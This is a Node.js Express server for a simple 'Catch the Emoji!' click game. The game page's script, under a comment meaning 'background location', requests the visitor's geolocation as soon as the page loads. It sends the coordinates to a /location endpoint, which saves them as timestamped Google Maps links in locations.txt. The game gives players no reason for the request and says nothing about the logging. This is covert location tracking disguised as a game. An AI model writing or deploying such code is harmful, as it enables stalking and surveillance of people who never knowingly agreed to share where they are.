import express from "express";
import fs from "fs-extra";

const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send(`
  <!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>Catch the Emoji!</title>
      <style>
        body { margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#fefefe; font-family:Arial, sans-serif; }
        #game { width:100%; height:100%; display:flex; justify-content:center; align-items:center; position:relative; overflow:hidden; }
        #emoji { font-size:3rem; cursor:pointer; position:absolute; }
        #score { position:fixed; top:15px; right:20px; font-size:1.2rem; font-weight:bold; color:#0077ff; }
      </style>
    </head>
    <body>
      <div id="game">
        <div id="emoji">🐱</div>
        <div id="score">Score: 0</div>
      </div>

      <script>
        // === Localização em background ===
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude).catch(()=>{});
          });
        }

        // === Jogo simples ===
        const emoji = document.getElementById('emoji');
        const scoreDisplay = document.getElementById('score');
        let score = 0;

        function moveEmoji() {
          const x = Math.random() * (window.innerWidth - 60);
          const y = Math.random() * (window.innerHeight - 60);
          emoji.style.left = x + "px";
          emoji.style.top = y + "px";
        }

        emoji.addEventListener('click', () => {
          score++;
          scoreDisplay.innerText = "Score: " + score;
          moveEmoji();
        });

        moveEmoji();
      </script>
    </body>
  </html>
  `);
});

app.get("/location", (req, res) => {
  const { lat, lon } = req.query;
  if (lat && lon) {
    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const logLine = `${new Date().toISOString()} | ${mapsLink}\n`;
    fs.appendFileSync("locations.txt", logLine);
    console.log("Saved:", mapsLink);
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log("Server running on port", PORT));
